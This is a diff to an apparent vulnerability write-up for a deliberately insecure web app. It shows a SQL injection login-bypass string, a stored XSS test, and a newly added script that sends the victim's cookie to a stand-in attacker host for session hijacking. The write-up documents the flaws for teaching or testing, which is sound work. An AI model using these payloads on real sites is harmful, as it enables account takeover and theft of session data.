@@ -12,6 +12,13 @@ enter "' OR 'a'='a';--" inside the Email Address field
 After logging in as a user,
 Add a note such as "<script> alert(1) </script>"
 
+Due to the insecure session management, an attacker can also retrieve the session data of the logged-in user with
+the following script.
+```
+<script>document.location='http://veryevilhacker.com?cookie='+document.cookie</script>
+```
+
+An attacker hosting the malicious site can look at the log data and sees the user's cookie value to authenticate as the user.
 
 
 ### Command injection:
